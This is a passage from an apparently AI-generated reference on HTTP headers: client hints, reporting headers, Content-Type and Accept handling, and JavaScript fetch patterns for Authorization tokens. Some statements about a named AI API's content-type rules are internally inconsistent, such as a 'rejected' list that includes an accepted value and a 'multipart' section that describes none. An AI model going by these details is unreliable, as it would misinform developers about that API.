Not actual HTTP headers but used in HTTP/2 framing.

**:method**

HTTP method (GET, POST, etc.)

**:scheme**

URL scheme (http, https)

**:authority**

Authority portion of URL (host + optional port)

**:path**

Path and query string

**:status**

Response status code (responses only)

These replace parts of HTTP/1.1 request/status lines. In HTTP/2, transmitted as header-like fields with `:` prefix.

### Deprecation and Timing Headers

**Deprecation**

Indicates resource deprecated, with optional timestamp.

```
Deprecation: true
Deprecation: @1640995200
```

Boolean or Unix timestamp. Alerts clients to plan migrations.

**Sunset**

Date/time resource will be removed.

```
Sunset: Wed, 21 Oct 2025 07:28:00 GMT
```

HTTP date format. More specific than Deprecation.

**Server-Timing**

Performance metrics from server.

```
Server-Timing: db;dur=53, app;dur=47.2
Server-Timing: cache;desc="Cache Read";dur=23.2, db;dur=53, app;dur=47.2
```

Metric format: `<name>;dur=<duration>;desc="<description>"`

Duration in milliseconds. Visible in browser developer tools.

**Timing-Allow-Origin**

Origins allowed to access Resource Timing API data.

```
Timing-Allow-Origin: *
Timing-Allow-Origin: https://example.com
```

Without this, cross-origin resources show limited timing data.

### Client Hints

Request headers allowing proactive content negotiation based on device/network conditions.

**Sec-CH-UA**

User agent's brand and version.

```
Sec-CH-UA: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
```

Structured header with brand list. Part of User-Agent Client Hints replacing traditional User-Agent.

**Sec-CH-UA-Mobile**

Whether user agent is mobile device.

```
Sec-CH-UA-Mobile: ?1
```

Structured boolean: `?1` (true) or `?0` (false)

**Sec-CH-UA-Platform**

Platform/OS user agent runs on.

```
Sec-CH-UA-Platform: "Windows"
```

Common values: "Android", "Chrome OS", "iOS", "Linux", "macOS", "Windows"

**Sec-CH-UA-Arch**

Platform architecture.

```
Sec-CH-UA-Arch: "x86"
```

Examples: "x86", "ARM"

**Sec-CH-UA-Bitness**

Architecture bitness.

```
Sec-CH-UA-Bitness: "64"
```

Typically "32" or "64"

**Sec-CH-UA-Model**

Device model.

```
Sec-CH-UA-Model: "Pixel 5"
```

Empty string for desktop.

**Sec-CH-UA-Full-Version**

Complete user agent version.

```
Sec-CH-UA-Full-Version: "96.0.4664.45"
```

**Device-Memory**

Approximate device RAM in GB.

```
Device-Memory: 8
```

Values:

```
0.25, 0.5, 1, 2, 4, 8 (rounded to specific tiers)
```

**Viewport-Width**

Layout viewport width in CSS pixels.

```
Viewport-Width: 1920
```

**Width**

Desired resource width in physical pixels.

```
Width: 1920
```

Used for image optimization.

**DPR**

Device pixel ratio.

```
DPR: 2
```

Pixels per CSS pixel. Common values: 1, 1.5, 2, 3

**Downlink**

Effective connection bandwidth (Mbps).

```
Downlink: 10
```

Estimated based on recent connections.

**ECT**

Effective connection type.

```
ECT: 4g
```

Values: `slow-2g`, `2g`, `3g`, `4g`

**RTT**

Round-trip time estimate (ms).

```
RTT: 100
```

Application-layer RTT.

**Save-Data**

Client preference for reduced data usage.

```
Save-Data: on
```

Only defined value: `on`. Omit when off.

**Accept-CH**

Advertises client hints server supports.

```
Accept-CH: DPR, Viewport-Width, Width
```

Comma-separated list. Sent by server to request specific hints.

**Accept-CH-Lifetime**

Duration (seconds) to remember Accept-CH preference.

```
Accept-CH-Lifetime: 86400
```

[Unverified] Deprecated in favor of Permissions-Policy mechanism for client hints.

### Link Header

**Link**

Relationships between current resource and other resources.

```
Link: <https://example.com/page2>; rel="next"
Link: <https://cdn.example.com/style.css>; rel="preload"; as="style"
Link: <https://example.com>; rel="canonical"
```

Format: `<URI>; rel="<relationship>"; [optional-params]`

Common `rel` values:

- `alternate`: Alternate representation
- `canonical`: Preferred URL
- `dns-prefetch`: Hint to pre-resolve DNS
- `icon`: Icon resource
- `manifest`: Web app manifest
- `next`/`prev`: Pagination
- `preconnect`: Hint to pre-connect
- `prefetch`: Hint to fetch for future navigation
- `preload`: Hint to fetch for current page
- `prerender`: Hint to pre-render
- `stylesheet`: CSS stylesheet

Additional parameters: `as` (resource type), `type` (MIME type), `media` (media query), `crossorigin`, `integrity`

Multiple Link headers or comma-separated values allowed.

### Alt-Svc

**Alt-Svc**

Advertises alternative services (protocol/host/port combinations).

```
Alt-Svc: h2=":443"; ma=2592000
Alt-Svc: h2="alt.example.com:443", h2=":443"
Alt-Svc: clear
```

Format: `<protocol>=<alt-authority>; ma=<max-age-seconds>`

Allows advertising HTTP/2, HTTP/3, or alternative hosts for same resource. `clear` removes previous advertisements.

Common protocols: `h2` (HTTP/2), `h3` (HTTP/3)

### Keep-Alive

**Keep-Alive**

Parameters for persistent connection.

```
Keep-Alive: timeout=5, max=100
```

Parameters:

- `timeout`: Seconds server will keep idle connection open
- `max`: Maximum requests on connection before closing

HTTP/1.1 only (HTTP/2 manages connections differently). Requires `Connection: keep-alive` header.

### NEL and Reporting

**NEL**

Network Error Logging configuration.

```
NEL: {"report_to":"default","max_age":2592000,"include_subdomains":true}
```

JSON object configuring network error reporting. Parameters:

- `report_to`: Reporting group name
- `max_age`: Policy lifetime (seconds)
- `include_subdomains`: Apply to subdomains
- `success_fraction`: Fraction of successful requests to report (0-1)
- `failure_fraction`: Fraction of failed requests to report (0-1)

**Report-To**

Defines endpoints for violation/error reporting.

```
Report-To: {"group":"default","max_age":10886400,"endpoints":[{"url":"https://example.com/reports"}],"include_subdomains":true}
```

JSON object with:

- `group`: Group name
- `max_age`: Policy lifetime
- `endpoints`: Array of reporting endpoints
- `include_subdomains`: Apply to subdomains

Used by CSP, NEL, and other reporting mechanisms.

**Reporting-Endpoints**

Newer alternative to Report-To.

```
Reporting-Endpoints: default="https://example.com/reports", csp-endpoint="https://example.com/csp-reports"
```

Simpler syntax than Report-To. Named endpoints for different report types.

---

## Content-Type Header

### Request Content-Type Requirements

The API strictly enforces `application/json` for all request bodies. Requests must include the header:

```
Content-Type: application/json
```

Omitting this header or specifying an incorrect media type results in a `400 Bad Request` response with an `invalid_request_error` indicating the content type mismatch.

### Character Encoding Specification

UTF-8 is the only supported character encoding. While the charset parameter is optional, explicit specification is recommended for clarity:

```
Content-Type: application/json; charset=utf-8
```

The API rejects requests with non-UTF-8 encodings. Text content in JSON payloads must be valid UTF-8 sequences.

### Response Content-Type

Standard responses return JSON with the header:

```
Content-Type: application/json
```

The API guarantees well-formed JSON in all non-streaming responses. Clients can parse response bodies without additional validation beyond standard JSON decoding.

### Streaming Response Content-Type

Streaming endpoints use Server-Sent Events (SSE) with a distinct media type:

```
Content-Type: text/event-stream
```

This signals that the response body contains an event stream following the SSE specification rather than a single JSON object. Clients must use SSE-compatible parsers to consume streaming responses.

#### SSE Charset Behavior

Event streams implicitly use UTF-8 encoding per the SSE specification. The charset parameter is typically omitted:

```
Content-Type: text/event-stream
```

Some implementations may explicitly include `charset=utf-8`, but this is redundant as UTF-8 is mandated by the SSE standard.

### Multipart Requests for Vision

When submitting images inline (not via URLs), requests use standard JSON encoding with base64-encoded image data embedded in the content blocks:

```json
{
  "model": "claude-sonnet-4-20250514",
  "messages": [{
    "role": "user",
    "content": [
      {
        "type": "image",
        "source": {
          "type": "base64",
          "media_type": "image/jpeg",
          "data": "/9j/4AAQSkZJRg..."
        }
      }
    ]
  }]
}
```

The outer request still uses `Content-Type: application/json`. The `media_type` field within the image source object specifies the image format.

#### Supported Image Media Types

Images must declare one of these media types in the `source.media_type` field:

- `image/jpeg`
- `image/png`
- `image/gif`
- `image/webp`

The API validates that base64-decoded data matches the declared media type. Mismatches trigger validation errors.

### Document Upload Content Types

PDF documents follow the same base64 embedding pattern:

```json
{
  "type": "document",
  "source": {
    "type": "base64",
    "media_type": "application/pdf",
    "data": "JVBERi0xLjQK..."
  }
}
```

Currently `application/pdf` is the only supported document media type.

### Content-Type Negotiation

The API does not support content negotiation via `Accept` headers. Response format is determined solely by the endpoint path and the presence of streaming parameters:

- `/v1/messages` → `application/json`
- `/v1/messages` with `stream: true` → `text/event-stream`

Clients cannot request alternative response formats like XML or Protocol Buffers.

### CORS and Preflight Requests

Browsers making cross-origin requests issue preflight `OPTIONS` requests. The API responds to these with appropriate CORS headers but no `Content-Type` header, as `OPTIONS` responses have no body:

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
```

The subsequent `POST` request must still include `Content-Type: application/json`.

### Content-Type Validation Strictness

The API performs exact media type matching. These variations are all rejected:

```
Content-Type: text/json                    ❌ Wrong type
Content-Type: application/javascript       ❌ Wrong subtype  
Content-Type: application/json; v=1        ❌ Invalid parameter
Content-Type: Application/JSON             ✓ Case-insensitive match
```

Media type and subtype comparison is case-insensitive per RFC 7231, but parameter names and values are case-sensitive.

### Compression and Content-Encoding

The API supports gzip compression for both requests and responses. Compressed payloads must declare compression via the `Content-Encoding` header, not in `Content-Type`:

```
Content-Type: application/json
Content-Encoding: gzip
```

The `Content-Type` describes the uncompressed payload format. Mixing encoding information into the media type (e.g., `application/json+gzip`) is non-standard and rejected.

#### Response Compression

Clients can request compressed responses via the `Accept-Encoding` header:

```
Accept-Encoding: gzip, deflate
```

When the API responds with compression, it includes:

```
Content-Type: application/json
Content-Encoding: gzip
```

Streaming responses can also be compressed, though SSE parsers must decompress the stream before event parsing.

### Empty Request Bodies

`GET` requests to informational endpoints (like model listing) require no request body. These requests should omit the `Content-Type` header entirely:

```
GET /v1/models HTTP/1.1
Authorization: Bearer sk-ant-...
```

Including `Content-Type: application/json` with an empty body is harmless but unnecessary.

### Error Response Content-Type

Error responses always use JSON encoding:

```
Content-Type: application/json
```

This applies even when the original request had an invalid `Content-Type`, ensuring clients can reliably parse error information.

### Batch API Content-Type

Batch requests use JSONL (JSON Lines) format with a specific media type:

```
Content-Type: application/jsonl
```

Each line in the request body contains a complete JSON object representing one batch item. The response also uses `application/jsonl` with one result object per line.

### Content-Type in Webhook Deliveries

Webhook notifications from the API use standard JSON:

```
Content-Type: application/json
```

Webhook receivers must accept this content type and parse JSON payloads from the notification POST requests.

### Future Content-Type Extensions

The API versioning strategy allows introducing new media types without breaking existing clients. Potential future additions might include:

- `application/vnd.anthropic.v2+json` for major version changes
- `application/protobuf` for binary protocol buffer encoding
- `application/cbor` for compact binary object representation

Current clients hard-coded to expect `application/json` will continue functioning as the v1 endpoints maintain this media type.

### Debugging Content-Type Issues

When encountering content-type errors, verify:

1. **Header presence**: Request includes `Content-Type: application/json`
2. **Header spelling**: No typos in header name (case-insensitive but often case-sensitive in frameworks)
3. **Body encoding**: Payload is valid UTF-8 JSON, not form-encoded or XML
4. **Framework defaults**: Some HTTP clients default to `application/x-www-form-urlencoded` for POST requests

Common framework-specific issues:

```python
# ❌ Wrong - sends form encoding by default
requests.post(url, data=json.dumps(payload))

# ✓ Correct - explicitly sets JSON content type
requests.post(url, json=payload)
```

```javascript
// ❌ Wrong - missing content type
fetch(url, {
  method: 'POST',
  body: JSON.stringify(payload)
})

// ✓ Correct - explicit headers
fetch(url, {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(payload)
})
```

---

## Accept Header

### Purpose and Function

The Accept header declares the MIME types a client can process, allowing content negotiation between client and server. The server examines this header to determine which representation format to return when multiple formats are available for the same resource.

**Request-Side Declaration**: The client sends Accept in the request header to advertise its capabilities. This differs from Content-Type, which describes the payload format in requests with bodies (POST, PUT, PATCH).

**Server Response Selection**: [Inference] Servers use Accept to choose among available representations. A resource might exist as JSON, XML, HTML, and plain text - the server selects the format matching client preferences. Servers may ignore Accept entirely and return a default format.

### Syntax Structure

The Accept header contains a comma-separated list of MIME types with optional quality factors:

```
Accept: text/html, application/json, application/xml;q=0.9, */*;q=0.8
```

**MIME Type Components**: Each entry consists of a type/subtype pair. Common patterns:

- `text/html` - HTML documents
- `application/json` - JSON data
- `application/xml` - XML documents
- `image/png` - PNG images
- `video/mp4` - MP4 video

**Wildcard Patterns**: Partial wildcards specify type families:

- `text/*` - any text format
- `image/*` - any image format
- `*/*` - any format whatsoever

### Quality Factors (q-values)

Quality factors express preference strength on a 0-1 scale, with 1 being highest priority.

**Default Quality**: MIME types without explicit q-values have an implicit quality of 1.0. `application/json` is equivalent to `application/json;q=1.0`.

**Preference Ordering**: The server should prefer higher q-values over lower ones when multiple acceptable formats exist:

```
Accept: application/json;q=1.0, application/xml;q=0.8, text/plain;q=0.5
```

This requests JSON preferentially, XML as second choice, and plain text as fallback.

**Zero Quality**: `q=0` explicitly marks a format as unacceptable. [Inference] This is rarely used since omitting the type achieves the same effect more simply.

### Browser Default Behavior

**Navigation Requests**: [Unverified - browser-specific] Browsers typically send Accept headers prioritizing HTML for navigation:

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

**Script Requests**: Fetch/XMLHttpRequest from JavaScript may send different defaults:

```
Accept: */*
```

This universal wildcard indicates the script will handle any response format.

**Image Requests**: `<img>` tags and CSS background images send Accept headers listing supported image formats:

```
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
```

[Unverified] Modern browsers prioritize newer, more efficient formats like AVIF and WebP.

### API Request Patterns

**JSON APIs**: Clients requesting JSON typically send:

```javascript
fetch(url, {
  headers: {
    'Accept': 'application/json'
  }
});
```

**Versioned APIs**: Some APIs use Accept headers for versioning:

```
Accept: application/vnd.myapi.v2+json
```

This vendor-specific MIME type (`vnd.`) indicates version 2 of the API with JSON format.

**Multiple Format Support**: Clients supporting multiple formats list them with preferences:

```
Accept: application/json, text/plain;q=0.9, text/html;q=0.8
```

### Content Negotiation Mechanics

**Server Selection Algorithm**: [Inference - not standardized] Servers typically:

1. Parse Accept header into format list with q-values
2. Sort by quality factor (descending)
3. Match against available representations
4. Return first matching format

**Tie-Breaking**: [Speculation] When multiple formats have identical q-values, servers may use:

- Order of appearance in Accept header
- Server-side preferences
- Resource-specific defaults

**Negotiation Failure**: When no acceptable format exists, servers respond with 406 Not Acceptable status. The response may include a list of available formats.

### Specificity Rules

More specific MIME types take precedence over less specific ones even at equal q-values.

**Specificity Hierarchy**:

1. Exact type/subtype: `application/json`
2. Type with wildcard: `application/*`
3. Universal wildcard: `*/*`

Example interpretation:

```
Accept: application/json, text/*, */*;q=0.8
```

Priority order: JSON > any text format > any other format at 0.8 quality.

### Common MIME Types

**Structured Data**:

- `application/json` - JSON objects and arrays
- `application/xml` - XML documents
- `application/x-yaml` - YAML (non-standard)
- `application/ld+json` - JSON-LD (linked data)

**Text Formats**:

- `text/plain` - unformatted text
- `text/html` - HTML documents
- `text/css` - CSS stylesheets
- `text/csv` - comma-separated values

**Binary Formats**:

- `application/octet-stream` - arbitrary binary
- `application/pdf` - PDF documents
- `application/zip` - ZIP archives

**Images**:

- `image/jpeg`, `image/png`, `image/gif`, `image/webp`, `image/svg+xml`

### Accept vs Accept-Encoding

These are distinct headers with different purposes:

**Accept**: Specifies content format (JSON vs XML vs HTML)

**Accept-Encoding**: Specifies compression algorithms (gzip, deflate, brotli)

Example combination:

```
Accept: application/json
Accept-Encoding: gzip, deflate, br
```

Requests JSON content with any of three compression options.

### RESTful API Conventions

**Resource-Centric Design**: REST APIs typically use Accept for format selection of the same logical resource:

- `GET /users/123` with `Accept: application/json` returns JSON
- `GET /users/123` with `Accept: application/xml` returns XML

**Alternative URL-Based Negotiation**: Some APIs use file extensions instead:

- `/users/123.json` for JSON
- `/users/123.xml` for XML

[Inference] Accept header negotiation is more RESTful since it separates resource identity from representation format.

### Parameters and Extensions

MIME types support additional parameters beyond q-values:

**Charset Parameter**:

```
Accept: text/html; charset=utf-8
```

[Unverified] Most modern systems default to UTF-8, making explicit charset declaration uncommon in Accept headers.

**Version Parameters**:

```
Accept: application/vnd.api+json; version=2
```

Custom parameters enable fine-grained negotiation.

### Fetch API Usage

**Default Behavior**: Fetch sends `Accept: */*` by default when no explicit header is provided.

**Explicit Setting**:

```javascript
fetch(url, {
  headers: {
    'Accept': 'application/json'
  }
});
```

**Headers Object**:

```javascript
const headers = new Headers();
headers.append('Accept', 'application/json');
headers.append('Accept', 'text/plain;q=0.9');  // Adds to existing

fetch(url, {headers});
```

Multiple append() calls accumulate into a comma-separated list.

### Server Implementation Considerations

**Default Fallback**: [Inference] Servers should define default formats for when Accept is absent or contains only wildcards. Returning 406 for missing Accept headers creates poor user experience.

**Format Priority**: Servers may implement preferences independent of client q-values:

```
Accept: application/xml;q=1.0, application/json;q=0.9
```

[Inference] A server might still return JSON if it considers JSON the superior format, though this violates strict content negotiation principles.

**Performance Implications**: [Speculation] Format conversion on-demand based on Accept headers may impact response time. Servers might cache multiple pre-rendered representations.

### Mobile and Bandwidth Constraints

**Lightweight Formats**: Mobile clients may prefer compact representations:

```
Accept: application/json;q=1.0, application/xml;q=0.5
```

JSON is typically more compact than XML.

**Image Optimization**: Modern mobile browsers advertise support for efficient formats:

```
Accept: image/webp, image/apng, image/*;q=0.8
```

[Inference] This enables servers to deliver smaller images, reducing bandwidth consumption.

### Security Considerations

**Information Disclosure**: Accept headers reveal client capabilities. [Speculation] This fingerprinting data could contribute to browser identification across sites.

**Injection Attacks**: [Inference] Malformed Accept headers should not cause server-side parsing failures. Robust parsing must handle:

- Extremely long headers
- Invalid q-value formats
- Malicious MIME type strings

**SSRF via Content Type**: [Speculation] If servers fetch resources based on Accept negotiation, carefully validate to prevent server-side request forgery.

### HTTP/2 and HTTP/3

**Header Compression**: HPACK (HTTP/2) and QPACK (HTTP/3) compress headers including Accept. Repeated identical Accept headers across requests compress efficiently.

**Static Table Entries**: [Unverified] Common Accept values may exist in compression static tables, reducing header overhead to single bytes.

### GraphQL and Accept Headers

GraphQL endpoints typically ignore Accept since they return JSON by default:

```
POST /graphql
Accept: application/json  // Often redundant
Content-Type: application/json

{"query": "{ user(id: 123) { name } }"}
```

[Inference] The query structure determines response shape rather than content negotiation.

### Debugging and Inspection

**Browser DevTools**: Network tab displays sent Accept headers for each request. This reveals browser default behavior and script-set values.

**Server Logs**: [Inference] Logging Accept headers helps understand client populations and format preferences, informing API design decisions.

**Testing Different Formats**: Tools like curl enable Accept header testing:

```bash
curl -H "Accept: application/json" https://api.example.com/resource
curl -H "Accept: application/xml" https://api.example.com/resource
```

### Multiple Accept Headers

The HTTP specification allows multiple Accept header lines, which concatenate logically:

```
Accept: application/json
Accept: text/html;q=0.9
```

Equivalent to:

```
Accept: application/json, text/html;q=0.9
```

[Inference] Single-line format is more common in practice.

### Absent Accept Headers

**Specification Guidance**: [Unverified] HTTP specifications suggest servers treat absent Accept as equivalent to `*/*`, accepting any format.

**Server Behavior Variance**: [Inference] Actual server implementations vary:

- Return default format (common)
- Return 406 Not Acceptable (rare, poor UX)
- Return format based on URL extension (common)

### Accept in Caching

**Vary Header**: Servers must include `Vary: Accept` when responses differ by Accept header:

```
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Accept
```

This instructs caches to store separate entries for different Accept values, preventing JSON responses from being served to clients requesting XML.

**Cache Key Composition**: [Inference] Caches combine URL and variant headers (including Accept) to form cache keys, enabling format-specific caching.

---

## Authorization Header in Fetch Context

### Basic Syntax

The `Authorization` header transmits credentials to authenticate HTTP requests. Standard syntax:

```javascript
fetch(url, {
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
  }
});
```

### Authentication Schemes

#### Bearer Token (Most Common for APIs)

Used for OAuth 2.0, JWT, and generic API tokens:

```javascript
const token = 'your-access-token';

fetch(url, {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

The scheme name `Bearer` is case-insensitive but conventionally capitalized. Space between scheme and token is required.

#### Basic Authentication

Encodes username:password in Base64:

```javascript
const username = 'user';
const password = 'pass';
const credentials = btoa(`${username}:${password}`);

fetch(url, {
  headers: {
    'Authorization': `Basic ${credentials}`
  }
});
```

**Security note**: Basic auth transmits credentials in every request. Always use HTTPS.

#### API Key (Custom Schemes)

Some APIs use custom header schemes:

```javascript
// Custom scheme
fetch(url, {
  headers: {
    'Authorization': `ApiKey ${apiKey}`
  }
});

// Or non-Authorization headers
fetch(url, {
  headers: {
    'X-API-Key': apiKey,
    'X-API-Secret': apiSecret
  }
});
```

#### Digest Authentication

Rarely used in modern fetch contexts. Requires complex challenge-response:

```javascript
// Digest auth typically requires parsing WWW-Authenticate challenge
// and computing hash responses - not commonly implemented in fetch
```

[Inference] Digest authentication is complex enough that libraries or browser built-in handling is typically preferred over manual implementation.

### Dynamic Token Management

#### Retrieving Tokens from Storage

```javascript
const token = localStorage.getItem('access_token');

fetch(url, {
  headers: {
    'Authorization': token ? `Bearer ${token}` : undefined
  }
});
```

**Security consideration**: localStorage is vulnerable to XSS. For sensitive tokens, consider httpOnly cookies or sessionStorage with appropriate security measures.

#### Token Refresh Pattern

```javascript
async function fetchWithAuth(url, options = {}) {
  let token = getAccessToken();
  
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
  
  // Token expired
  if (response.status === 401) {
    token = await refreshAccessToken();
    
    // Retry with new token
    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
  }
  
  return response;
}

async function refreshAccessToken() {
  const refreshToken = getRefreshToken();
  
  const response = await fetch('/auth/refresh', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${refreshToken}`
    }
  });
  
  const { access_token } = await response.json();
  setAccessToken(access_token);
  return access_token;
}
```

### Headers Object Construction

#### Using Headers Constructor

```javascript
const headers = new Headers();
headers.append('Authorization', `Bearer ${token}`);
headers.append('Content-Type', 'application/json');

fetch(url, { headers });
```

#### Conditional Header Inclusion

```javascript
const headers = {
  'Content-Type': 'application/json',
  ...(token && { 'Authorization': `Bearer ${token}` })
};

fetch(url, { headers });
```

### CORS and Authorization

The `Authorization` header triggers CORS preflight requests. Server must respond with appropriate headers:

```javascript
// Client-side - no special handling needed
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Server must respond to OPTIONS preflight with:
// Access-Control-Allow-Origin: https://your-domain.com
// Access-Control-Allow-Headers: Authorization, Content-Type
// Access-Control-Allow-Methods: GET, POST, etc.
```

Credentials mode considerations:

```javascript
// For cross-origin requests with Authorization
fetch(url, {
  credentials: 'include', // If using cookies alongside Authorization
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

[Inference] The `credentials: 'include'` mode is typically unnecessary when using `Authorization` header alone, as the token is explicitly provided. It's relevant when combining with cookie-based authentication.

### Request Interceptor Pattern

Creating a wrapper for consistent auth handling:

```javascript
class AuthenticatedFetch {
  constructor(baseURL, getToken) {
    this.baseURL = baseURL;
    this.getToken = getToken;
  }
  
  async fetch(endpoint, options = {}) {
    const token = await this.getToken();
    const url = `${this.baseURL}${endpoint}`;
    
    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        ...(token && { 'Authorization': `Bearer ${token}` })
      }
    });
  }
  
  get(endpoint, options) {
    return this.fetch(endpoint, { ...options, method: 'GET' });
  }
  
  post(endpoint, data, options) {
    return this.fetch(endpoint, {
      ...options,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...options?.headers
      },
      body: JSON.stringify(data)
    });
  }
}

// Usage
const api = new AuthenticatedFetch('https://api.example.com', () => localStorage.getItem('token'));
const response = await api.get('/users');
```

### Multiple Authentication Methods

Handling different auth schemes dynamically:

```javascript
function getAuthHeader(authType, credentials) {
  switch (authType) {
    case 'bearer':
      return `Bearer ${credentials.token}`;
    
    case 'basic':
      return `Basic ${btoa(`${credentials.username}:${credentials.password}`)}`;
    
    case 'apikey':
      return `ApiKey ${credentials.key}`;
    
    default:
      return null;
  }
}

fetch(url, {
  headers: {
    'Authorization': getAuthHeader('bearer', { token: 'abc123' })
  }
});
```

### Token Expiration Handling

#### Proactive Expiration Check

```javascript
function isTokenExpired(token) {
  try {
    const payload = JSON.parse(atob(token.split('.')[1]));
    return payload.exp * 1000 < Date.now();
  } catch (e) {
    return true;
  }
}

async function fetchWithValidToken(url, options = {}) {
  let token = getAccessToken();
  
  if (isTokenExpired(token)) {
    token = await refreshAccessToken();
  }
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

[Inference] This assumes JWT format with standard `exp` claim. Non-JWT tokens require alternative expiration tracking mechanisms.

#### Retry Queue for Concurrent Requests

```javascript
class TokenManager {
  constructor() {
    this.refreshPromise = null;
  }
  
  async getValidToken() {
    let token = getAccessToken();
    
    if (isTokenExpired(token)) {
      // Prevent multiple simultaneous refresh attempts
      if (!this.refreshPromise) {
        this.refreshPromise = this.refresh().finally(() => {
          this.refreshPromise = null;
        });
      }
      token = await this.refreshPromise;
    }
    
    return token;
  }
  
  async refresh() {
    const refreshToken = getRefreshToken();
    const response = await fetch('/auth/refresh', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${refreshToken}`
      }
    });
    
    const { access_token } = await response.json();
    setAccessToken(access_token);
    return access_token;
  }
}

const tokenManager = new TokenManager();

async function authenticatedFetch(url, options = {}) {
  const token = await tokenManager.getValidToken();
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### Security Best Practices

#### Avoiding Token Exposure

```javascript
// Never log tokens
console.log(`Fetching with token: ${token}`); // BAD

// Never send tokens to untrusted origins
const trustedDomains = ['api.example.com', 'auth.example.com'];

function shouldIncludeAuth(url) {
  const urlObj = new URL(url);
  return trustedDomains.includes(urlObj.hostname);
}

fetch(url, {
  headers: {
    ...(shouldIncludeAuth(url) && { 'Authorization': `Bearer ${token}` })
  }
});
```

#### Removing Sensitive Headers from Error Logs

```javascript
async function safeFetch(url, options = {}) {
  try {
    return await fetch(url, options);
  } catch (error) {
    // Strip Authorization before logging
    const safeOptions = {
      ...options,
      headers: {
        ...options.headers,
        Authorization: '[REDACTED]'
      }
    };
    
    console.error('Fetch failed:', { url, options: safeOptions, error });
    throw error;
  }
}
```

### Authorization with Different Content Types

#### Form Data with Auth

```javascript
const formData = new FormData();
formData.append('file', fileInput.files[0]);

fetch(url, {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`
    // Do NOT set Content-Type for FormData - browser sets it with boundary
  },
  body: formData
});
```

#### GraphQL with Auth

```javascript
fetch('/graphql', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    query: `
      query GetUser($id: ID!) {
        user(id: $id) {
          name
          email
        }
      }
    `,
    variables: { id: '123' }
  })
});
```

### Handling 401 Unauthorized Responses

```javascript
async function fetchWithAuthRetry(url, options = {}, maxRetries = 1) {
  let token = getAccessToken();
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (response.status === 401 && attempt < maxRetries) {
      // Attempt token refresh
      try {
        token = await refreshAccessToken();
        continue;
      } catch (refreshError) {
        // Refresh failed - redirect to login or handle accordingly
        handleAuthenticationFailure();
        throw new Error('Authentication failed');
      }
    }
    
    return response;
  }
}
```

### Authorization with Server-Sent Events (SSE)

SSE doesn't support custom headers via EventSource. Workarounds:

```javascript
// Option 1: Token in URL (less secure)
const token = getAccessToken();
const eventSource = new EventSource(`/events?token=${token}`);

// Option 2: Use fetch for initial connection, then stream
async function authenticatedSSE(url) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`,
      'Accept': 'text/event-stream'
    }
  });
  
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    
    const chunk = decoder.decode(value);
    // Process SSE data manually
  }
}
```

[Inference] The standard EventSource API limitation with headers is a known constraint. The fetch-based streaming approach provides header support but requires manual SSE parsing.

### Complete Production-Ready Pattern

```javascript
class AuthClient {
  constructor(config) {
    this.baseURL = config.baseURL;
    this.tokenManager = new TokenManager(config);
    this.maxRetries = config.maxRetries || 1;
  }
  
  async fetch(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    for (let attempt = 0; attempt <= this.maxRetries; attempt++) {
      try {
        const token = await this.tokenManager.getValidToken();
        
        const response = await fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${token}`
          }
        });
        
        // Handle 401 with retry
        if (response.status === 401 && attempt < this.maxRetries) {
          await this.tokenManager.forceRefresh();
          continue;
        }
        
        // Handle other errors
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        return response;
        
      } catch (error) {
        if (attempt === this.maxRetries) throw error;
      }
    }
  }
  
  async get(endpoint, options) {
    return this.fetch(endpoint, { ...options, method: 'GET' });
  }
  
  async post(endpoint, data, options) {
    return this.fetch(endpoint, {
      ...options,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...options?.headers
      },
      body: JSON.stringify(data)
    });
  }
  
  async put(endpoint, data, options) {
    return this.fetch(endpoint, {
      ...options,
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        ...options?.headers
      },
      body: JSON.stringify(data)
    });
  }
  
  async delete(endpoint, options) {
    return this.fetch(endpoint, { ...options, method: 'DELETE' });
  }
}
```

---

## User-Agent and Other Metadata Headers

### User-Agent Header

The `User-Agent` request header identifies the client software making the request, including the application, operating system, vendor, and version information.

**Structure and Format**

User-Agent strings follow a loose convention of product tokens and comments:

```
User-Agent: Mozilla/5.0 (platform) product/version extensions
```

Common patterns:

- **Browsers**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
